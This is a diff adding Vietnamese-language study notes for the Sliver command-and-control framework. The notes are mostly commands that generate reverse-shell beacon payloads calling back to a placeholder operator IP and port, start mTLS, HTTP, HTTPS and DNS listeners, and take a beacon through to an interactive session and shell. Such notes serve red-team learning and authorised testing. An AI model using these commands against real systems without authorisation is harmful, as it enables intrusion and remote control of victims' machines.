@@ -1,0 +1,78 @@
+# Sliver
+
+## Setup
+
+### Tạo payload
+
+Sliver chia payload reverse shell thành hai loại chính đó là `Beacon` và `Session` payload
+
+#### Beacon Shellcode
+
+```
+sliver > generate beacon --mtls <ip address>:<port> -f shellcode
+```
+
+#### Beacon Binary
+
+```
+sliver > generate beacon --mtls <ip address>:<port> --os #{os} -f #{file_format}
+```
+
+- `os`: windows | linux
+- `file_format`: exe | elf
+
+### Stager
+
+**Tại sao phải dùng stager ?**
+> Đọc trong [Stager Note](./stager.md) nhé :>
+
+## Exploit
+
+### Tạo Listener
+
+#### MTLS
+
+```
+sliver > mtls
+```
+
+#### HTTP
+
+```
+sliver > http
+```
+
+#### HTTPS
+
+```
+sliver > https
+```
+
+#### DNS
+
+```
+sliver > dns
+```
+
+### Post Exploit
+
+#### Tương tác beacon
+
+```
+sliver > beacons
+sliver > use <beacon_id>
+```
+
+### Tạo session từ beacon
+
+```
+sliver (<beacon_name>) > interactive
+sliver (<beacon_name>) > sessions
+sliver (<beacon_name>) > use <session_id>
+```
+
+### Tạo shell từ session
+
+```
+sliver (<session_name>) > shell
+```
